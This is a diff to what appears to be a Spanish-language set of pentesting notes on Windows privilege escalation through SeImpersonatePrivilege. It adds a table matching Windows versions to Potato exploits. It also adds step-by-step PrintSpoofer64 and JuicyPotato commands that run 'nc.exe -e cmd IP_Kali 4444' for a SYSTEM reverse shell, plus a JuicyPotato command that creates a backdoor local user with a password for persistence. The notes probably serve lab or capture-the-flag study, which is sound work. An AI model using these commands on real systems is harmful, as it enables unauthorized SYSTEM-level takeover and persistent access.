@@ -117,21 +117,36 @@ Notas:
 ```powershell
 2. 'SetImpersonatePrivilege' = Si un usuario tiene el privilegio antes mencionado se puede aprovechar para obtener acceso a nivel de SYSTEM
 
-❯ .\PrintSpoofer64.exe -c "cmd /c C:\tmp\nc.exe IP_Kali 4444 -e cmd"
-# Ejecutar un comando como nt authority \system para hacer una Reverse shell 
+IMPORTANTE --> CONOCER LA VERIÓN del SISTEMA OPERATIVO PARAA SABER QUE POTATO USAR <-- 
+❯ systeminfo 
 
-❯ rlwrap nc -nlvp 4444
-# Obtener una shell como nt authority \system en kali
+   Sistema Operativo	                              Técnicas
+Windows Server 2008 / 2008 R2	            JuicyPotato, RottenPotato
+Windows Server 2012 / 2012 R2	            JuicyPotato, RoguePotato, GodPotato
+Windows Server 2016 (<1809)	                JuicyPotato
+Windows Server 2019 / Windows 10 1809+	    PrintSpoofer, RoguePotato, GodPotato
+Windows Server 2022	                        GodPotato, SigmaPotato
 
-NOTA:
-	- Subir a la máquina víctima el netcat 
 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 
-2. 'SetImpersonatePrivilege' = Si un usuario tiene el privilegio antes mencionado se puede aprovechar para obtener acceso a nivel de SYSTEM
+# USAR PrintSpoofer64
+
+PASOS con 'PrintSpoofer64' para ejecuta una Reverse Shell:
+# Descargar PrintSpoofer64, Netcat y transferirlos a la máquina Windows en 'C:\Windows\Temp\'
+❯ https://github.com/itm4n/PrintSpoofer/releases   
+❯ https://eternallybored.org/misc/netcat/
+
+❯ .\PrintSpoofer64.exe -c "cmd /c C:\Windows\Temp\nc.exe IP_Kali 4444 -e cmd"
+# Ejecutar un comando como nt authority \system para hacer una Reverse shell 
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+# USAR PetitPotato
 
 PASOS con 'PetitPotato' para crear un usuario y tener persistencia:
 # Descargar el archivo y transferirlo a la máquina Windows comprometida 
 ❯ https://github.com/wh0amitz/PetitPotato/releases/tag/v1.0.0
+
 ❯ .\PetitPotato.exe 3 "cmd /c whoami"    
 # Ejecutar en Windows y crear una cmd con el usuario 'NT Authority\System'
 # EfsID = '3' es el numero de API a usar  
@@ -145,11 +160,12 @@ Notas:
 
 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 
-2. 'SeImpersonatePrivilege o SeAssignPrimaryTokenPrivilege' = Si un usuario tiene al menos un de los anteriores privilegios mencionados se puede aprovechar para obtener acceso a nivel de SYSTEM
+# USAR JuicyPotato
 
 PASOS con 'JuicyPotato' para crear un usuario y tener persistencia:
 # Descargar el archivo y transferirlo a la máquina Windows comprometida 
 ❯ https://github.com/ohpe/juicy-potato/releases/tag/v0.1
+
 ❯ .\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net user omar P4ssw0rd /add" -l 1337
 # Ejecutar en Windows para crear un usuario
 	# t = Crear un proceso 
@@ -169,12 +185,14 @@ Notas:
 
 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 
-2. 'SeImpersonatePrivilege o SeAssignPrimaryTokenPrivilege' = Si un usuario tiene al menos un de los anteriores privilegios mencionados se puede aprovechar para obtener acceso a nivel de SYSTEM
+# OTRA FORMA CON JuicyPotato
 
 PASOS con 'JuicyPotato' para ejecuta una Reverse Shell:
-# Descargar JuicyPotato, Netcat y transferirlos a la máquina Windows
+# Descargar JuicyPotato, Netcat y transferirlos a la máquina Windows en 'C:\Windows\Temp\'
 ❯ https://github.com/ohpe/juicy-potato/releases/tag/v0.1    
-❯ .\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\Windows\Temp\nc.exe -e cmd IP_Kali 443"
+❯ https://eternallybored.org/misc/netcat/
+
+❯ .\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\Windows\Temp\nc.exe -e cmd IP_Kali 4444"
 ```
 
 ## Grupos Windows para escalar 
